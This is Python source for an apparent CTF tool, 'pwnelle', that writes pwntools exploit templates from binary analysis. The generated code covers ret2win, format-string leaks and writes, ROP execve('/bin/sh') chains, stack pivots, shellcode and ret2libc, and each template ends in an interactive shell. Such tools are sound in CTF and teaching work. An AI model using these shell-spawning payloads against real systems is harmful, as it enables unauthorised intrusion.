"""
Template generator module for pwnelle.

Generates exploit template files based on binary analysis.
"""

import os
import time
from pathlib import Path
from typing import Dict, List, Any, Optional


class TemplateGenerator:
    """Generate exploit templates from analysis results."""
    
    def __init__(
        self,
        analysis_results: Dict[str, Any],
        binary_path: str,
        output_dir: str
    ):
        """
        Initialize the template generator.
        
        Args:
            analysis_results: Analysis results dictionary
            binary_path: Path to the analyzed binary
            output_dir: Directory to write templates to
        """
        self.analysis_results = analysis_results
        self.binary_path = binary_path
        self.binary_name = os.path.basename(binary_path)
        self.output_dir = output_dir
        self.template_path = os.path.join(output_dir, "exploit_template.py")
    
    def generate_template(self) -> None:
        """Generate the exploit template file."""
        template = self._create_template()
        
        with open(self.template_path, "w") as f:
            f.write(template)
    
    def _create_template(self) -> str:
        """Create the exploit template based on analysis results."""
        # Start with basic template
        template = [
            "#!/usr/bin/env python3",
            "# pwnelle auto-generated exploit template",
            f"# Target: {self.binary_name}",
            f"# Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            "from pwn import *",
            "from gadgets import G  # Import PIE-relative gadget offsets",
            "",
            f"elf = context.binary = ELF('./{self.binary_name}')",
            f"p = process('./{self.binary_name}')  # change to remote() for CTF server",
            "",
            "# ===== Setup context =============================================",
            f"context.arch = '{self.analysis_results.get('basic_info', {}).get('architecture', 'amd64')}'",
            f"context.log_level = 'info'",
            "",
        ]
        
        # If PIE is enabled, add PIE base leak
        if self.analysis_results.get("security", {}).get("pie", False):
            template.extend([
                "# ===== Leak PIE base (adjust for your challenge) ==============",
                "p.recvuntil(b'puts: ')  # Adjust based on actual output",
                "leak = int(p.recvline().strip(), 16)",
                "pie_base = leak - elf.plt['puts']  # Adjust based on what was leaked",
                "log.success(f\"PIE base @ {hex(pie_base)}\")",
                "",
            ])
        
        # Add gadget resolution
        template.extend([
            "# ===== Resolve gadgets ===========================================",
        ])
        
        # Add gadgets based on which ones were found
        if "rop_gadgets" in self.analysis_results and "key_gadgets" in self.analysis_results["rop_gadgets"]:
            key_gadgets = self.analysis_results["rop_gadgets"]["key_gadgets"]
            
            if self.analysis_results.get("security", {}).get("pie", False):
                # PIE is enabled
                for gadget_name in key_gadgets.keys():
                    variable_name = gadget_name.lower()
                    template.append(f"{variable_name} = pie_base + G['{gadget_name}']")
            else:
                # PIE is disabled
                for gadget_name in key_gadgets.keys():
                    variable_name = gadget_name.lower()
                    template.append(f"{variable_name} = G['{gadget_name}']")
        else:
            template.append("# No ROP gadgets found or gadgets.py not available")
        
        template.append("")
        
        # Add exploit logic based on predicted paths
        template.extend([
            "# ===== Build your exploit ========================================",
        ])
        
        # Check if any exploit paths were predicted
        if "exploit_paths" in self.analysis_results and self.analysis_results["exploit_paths"]:
            # Get the most likely exploit path (first one with highest confidence)
            def confidence_score(x):
                if x["confidence"] == "high":
                    return 3
                elif x["confidence"] == "medium":
                    return 2
                else:
                    return 1
            
            exploit_paths = sorted(self.analysis_results["exploit_paths"], key=confidence_score, reverse=True)
            primary_path = exploit_paths[0]["type"]
            
            # Generate different template based on exploit type
            if primary_path == "ret2win":
                # Get the win function
                win_func = None
                for path in exploit_paths:
                    if path["type"] == "ret2win" and "target" in path:
                        win_func = path["target"]
                        break
                
                if win_func and win_func in self.analysis_results.get("interesting_functions", {}):
                    win_addr = self.analysis_results["interesting_functions"][win_func]["address"]
                    
                    if self.analysis_results.get("security", {}).get("pie", False):
                        template.extend([
                            f"# Ret2win: Call {win_func}()",
                            f"win_addr = pie_base + 0x{win_addr:x}  # Adjust if needed",
                            "",
                            "# Build ROP chain",
                            "rop = flat(",
                            "    win_addr",
                            ")",
                            "",
                            "# Determine buffer overflow offset (adjust through testing)",
                            "offset = 40  # ADJUST THIS VALUE",
                            "",
                            "payload = b'A' * offset + rop",
                            "p.sendline(payload)"
                        ])
                    else:
                        template.extend([
                            f"# Ret2win: Call {win_func}()",
                            f"win_addr = 0x{win_addr:x}",
                            "",
                            "# Build ROP chain",
                            "rop = flat(",
                            "    win_addr",
                            ")",
                            "",
                            "# Determine buffer overflow offset (adjust through testing)",
                            "offset = 40  # ADJUST THIS VALUE",
                            "",
                            "payload = b'A' * offset + rop",
                            "p.sendline(payload)"
                        ])
                else:
                    template.extend([
                        "# Ret2win strategy suggested, but no specific win function found",
                        "# Look for functions like 'win', 'shell', 'flag', etc.",
                        "",
                        "# Build ROP chain",
                        "rop = flat(",
                        "    # win_function_address",
                        ")",
                        "",
                        "# Determine buffer overflow offset (adjust through testing)",
                        "offset = 40  # ADJUST THIS VALUE",
                        "",
                        "payload = b'A' * offset + rop",
                        "p.sendline(payload)"
                    ])
            
            elif primary_path == "format_string":
                template.extend([
                    "# Format string vulnerability detected",
                    "",
                    "# === Option 1: Information leak ===",
                    "# Send format string to leak values from the stack",
                    "p.sendline(b'%p.' * 20)  # Leak 20 stack values",
                    "leak = p.recvline().strip()",
                    "log.info(f\"Leaked: {leak}\")",
                    "",
                    "# === Option 2: Arbitrary write (careful!) ===",
                    "# target_addr = 0xdeadbeef  # Address to write to",
                    "# value = 0x12345678  # Value to write",
                    "",
                    "# # Craft format string for write",
                    "# offset = 10  # ADJUST THIS - find your input's position on stack",
                    "# payload = fmtstr_payload(offset, {target_addr: value})",
                    "# p.sendline(payload)",
                    ""
                ])
            
            elif primary_path == "rop_chain":
                template.extend([
                    "# ROP chain execution strategy",
                    "",
                    "# === Example: execve(\"/bin/sh\", 0, 0) syscall ===",
                    "# Find or create '/bin/sh' string",
                    "binsh = next(elf.search(b'/bin/sh\\x00'))",
                    "if not binsh:",
                    "    binsh = 0  # REPLACE with writeable address",
                    "    # You'll need to write '/bin/sh\\x00' there first",
                    "",
                    "if 'pop_rdi' in G and 'pop_rsi_r15' in G and 'pop_rdx' in G and 'syscall' in G:",
                    "    # For x86_64",
                    "    rop = flat(",
                    "        pop_rdi, binsh,        # First arg: '/bin/sh'",
                    "        pop_rsi_r15, 0, 0,     # Second arg: NULL",
                    "        pop_rdx, 0,            # Third arg: NULL", 
                    "        pop_rax, 59,           # syscall number for execve",
                    "        syscall                # Execute syscall",
                    "    )",
                    "elif 'pop_ebx' in G and 'pop_ecx' in G and 'pop_edx' in G and 'int_0x80' in G:",
                    "    # For x86 (32-bit)",
                    "    rop = flat(",
                    "        pop_ebx, binsh,        # First arg: '/bin/sh'",
                    "        pop_ecx, 0,            # Second arg: NULL",
                    "        pop_edx, 0,            # Third arg: NULL",
                    "        pop_eax, 11,           # syscall number for execve (32-bit)",
                    "        int_0x80               # Execute syscall",
                    "    )",
                    "else:",
                    "    log.error(\"Required gadgets not found. Look for alternatives.\")",
                    "",
                    "# Determine buffer overflow offset (adjust through testing)",
                    "offset = 40  # ADJUST THIS VALUE",
                    "",
                    "payload = b'A' * offset + rop",
                    "p.sendline(payload)",
                ])
            
            elif primary_path == "stack_pivot":
                template.extend([
                    "# Stack pivot strategy detected",
                    "",
                    "# === Example: pivot to a controlled memory region ===",
                    "# 1. Locate a controlled memory region",
                    "buffer_addr = 0xdeadbeef  # REPLACE with actual buffer address",
                    "",
                    "# 2. Prepare fake stack with ROP chain",
                    "fake_stack = flat(",
                    "    # Your ROP chain here",
                    "    pop_rdi, 0,            # Example gadget usage",
                    ")",
                    "",
                    "# 3. Send fake stack to the buffer",
                    "p.sendline(fake_stack)",
                    "",
                    "# 4. Trigger pivot (e.g., overflow to control rbp and ret to leave;ret)",
                    "if 'leave_ret' in G:",
                    "    payload = flat(",
                    "        b'A' * 32,         # Padding",
                    "        buffer_addr - 8,   # New RBP (pointer to our buffer-8)",
                    "        leave_ret          # Pivot gadget",
                    "    )",
                    "    p.sendline(payload)",
                    "else:",
                    "    log.error(\"No leave;ret gadget found. Look for alternatives.\")",
                ])
            
            elif primary_path == "shellcode":
                template.extend([
                    "# Shellcode execution strategy (NX is disabled)",
                    "",
                    "# === Generate shellcode ===",
                    "shellcode = asm(shellcraft.sh())",
                    "",
                    "# === Place and execute shellcode ===",
                    "# Option 1: Return to shellcode on stack",
                    "buffer_addr = 0xdeadbeef  # REPLACE with address of your buffer",
                    "",
                    "payload = shellcode.ljust(40, b'A')  # Adjust padding",
                    "payload += p64(buffer_addr)          # Return to shellcode",
                    "",
                    "# Option 2: Place shellcode at known buffer and return to it",
                    "# p.sendline(b'MARKER' + shellcode)  # Send shellcode to a buffer",
                    "# p.recvuntil(b'MARKER')             # Wait for program to receive it",
                    "# Now overflow stack to return to that buffer",
                    "",
                    "p.sendline(payload)",
                ])
            
            elif primary_path == "libc_leak":
                template.extend([
                    "# Libc leak and ret2libc strategy",
                    "",
                    "# === Step 1: Leak libc address ===",
                    "# Use puts/printf to leak GOT entry",
                    "if 'pop_rdi' in G:",
                    "    rop1 = flat(",
                    "        pop_rdi, elf.got['puts'],  # Address to print",
                    "        elf.plt['puts'],           # Call puts",
                    "        elf.symbols['main']        # Return to main",
                    "    )",
                    "",
                    "    offset = 40  # ADJUST THIS VALUE",
                    "    payload = b'A' * offset + rop1",
                    "    p.sendline(payload)",
                    "",
                    "    # Parse the leak",
                    "    leak = u64(p.recvline().strip().ljust(8, b'\\x00'))",
                    "    log.success(f\"Leaked puts@GLIBC: {hex(leak)}\")",
                    "",
                    "    # === Step 2: Calculate libc base ===",
                    "    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # ADJUST PATH",
                    "    libc.address = leak - libc.symbols['puts']",
                    "    log.success(f\"Libc base: {hex(libc.address)}\")",
                    "",
                    "    # === Step 3: Build final ROP chain ===",
                    "    # Option 1: system(\"/bin/sh\")",
                    "    rop2 = flat(",
                    "        pop_rdi, next(libc.search(b'/bin/sh\\x00')),",
                    "        libc.symbols['system']",
                    "    )",
                    "",
                    "    # Option 2: execve(\"/bin/sh\", 0, 0)",
                    "    # rop2 = flat(",
                    "    #    pop_rdi, next(libc.search(b'/bin/sh\\x00')),",
                    "    #    pop_rsi_r15, 0, 0,",
                    "    #    pop_rdx, 0,",
                    "    #    libc.symbols['execve']",
                    "    # )",
                    "",
                    "    # Option 3: one_gadget",
                    "    # Potential one_gadgets: (find with one_gadget tool)",
                    "    # one_gadget = libc.address + 0xdeadbeef  # REPLACE with actual offset",
                    "    # rop2 = flat(one_gadget)",
                    "",
                    "    # Send final payload",
                    "    payload = b'A' * offset + rop2",
                    "    p.sendline(payload)",
                    "else:",
                    "    log.error(\"Required gadgets not found. Look for alternatives.\")",
                ])
        else:
            template.extend([
                "# No specific exploit path predicted",
                "",
                "# Common steps:",
                "# 1. Find buffer overflow offset:",
                "# offset = cyclic_find(0x6161616161616166)  # Example",
                "",
                "# 2. Build ROP chain:",
                "rop = flat(",
                "    # Your ROP chain here",
                ")",
                "",
                "# 3. Craft payload",
                "offset = 40  # ADJUST THIS VALUE",
                "payload = b'A' * offset + rop",
                "p.sendline(payload)",
            ])
        
        # Add interactive mode
        template.extend([
            "",
            "# ===== Get shell ================================================",
            "p.interactive()"
        ])
        
        return "\n".join(template) 